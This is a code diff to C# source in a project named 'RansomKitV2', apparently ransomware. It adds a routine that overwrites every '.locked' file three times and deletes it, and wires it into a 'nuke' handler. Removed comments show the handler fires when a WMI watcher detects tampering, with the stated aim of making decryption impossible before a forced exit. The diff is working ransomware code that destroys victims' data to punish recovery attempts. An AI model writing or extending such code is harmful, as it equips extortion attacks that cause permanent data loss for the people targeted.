@@ -1,7 +1,9 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Management;
+using System.Security.Cryptography;
 using System.Threading;
 
 namespace RansomKitV2
@@ -145,15 +147,74 @@ namespace RansomKitV2
 
         // ── Nuclear option ────────────────────────────────────────
 
+
+        /// <summary>
+        /// Securely overwrite then delete all .locked files.
+        /// Called when the reset watcher detects tampering or on operator nuke trigger.
+        /// </summary>
+        public static void NukeLockedFiles(IEnumerable<string> lockedFiles)
+        {
+            foreach (var path in lockedFiles)
+            {
+                try
+                {
+                    if (!File.Exists(path)) continue;
+
+                    var info = new FileInfo(path);
+                    long size = info.Length;
+
+                    if (size > 0)
+                    {
+                        // Three-pass overwrite: zeros, ones, random
+                        using var fs = new FileStream(
+                            path, FileMode.Open, FileAccess.Write,
+                            FileShare.None, 4096, FileOptions.WriteThrough);
+
+                        byte[] buf = new byte[Math.Min(size, 65536)];
+
+                        // Pass 1 — zeros
+                        Array.Clear(buf);
+                        Overwrite(fs, buf, size);
+
+                        // Pass 2 — ones
+                        Array.Fill(buf, (byte)0xFF);
+                        Overwrite(fs, buf, size);
+
+                        // Pass 3 — random
+                        RandomNumberGenerator.Fill(buf);
+                        Overwrite(fs, buf, size);
+
+                        fs.Flush(flushToDisk: true);
+                    }
+
+                    File.Delete(path);
+                }
+                catch
+                {
+                    // best-effort — skip locked/in-use files
+                }
+            }
+        }
+
+        static void Overwrite(FileStream fs, byte[] buf, long totalBytes)
+        {
+            fs.Seek(0, SeekOrigin.Begin);
+            long written = 0;
+            while (written < totalBytes)
+            {
+                int chunk = (int)Math.Min(buf.Length, totalBytes - written);
+                fs.Write(buf, 0, chunk);
+                written += chunk;
+            }
+        }
+
         static void NukeAndExit(string reason)
         {
-            // Stop the WMI watcher so we don't re-enter
             try { _wmiWatcher?.Stop(); } catch { }
 
-            // Wipe every .locked file — makes decryption impossible
-            CryptoEngine.NukeLockedFiles(_lockedFiles);
+            // call the local method, not CryptoEngine
+            NukeLockedFiles(_lockedFiles);
 
-            // Hard exit — no cleanup, no managed shutdown
             Environment.FailFast("Reset guard triggered: " + reason);
         }
     }
